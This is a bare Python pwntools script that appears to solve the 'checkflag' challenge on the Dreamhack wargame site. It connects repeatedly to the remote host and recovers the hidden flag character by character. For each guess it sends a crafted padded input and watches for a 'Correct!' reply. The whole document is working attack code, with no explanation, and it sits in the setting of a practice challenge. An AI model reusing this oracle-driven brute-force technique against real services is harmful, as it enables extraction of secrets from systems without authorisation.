
from pwn import *

table = ['\x00', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '}']

find = []
for i in range(1, 64):
    print(i)
    print(find)
    for c in table:
        #s = process("./checkflag")
        s = remote("host1.dreamhack.games", 24216)
        s.sendafter("? ", "A"*(63-i) + c + ''.join(find) + "\x00" + "A"*(63-i))
        if b"Correct!" in s.recvline():
            print("find!"+repr(c))
            find.insert(0, c)
            break
print(''.join(find))
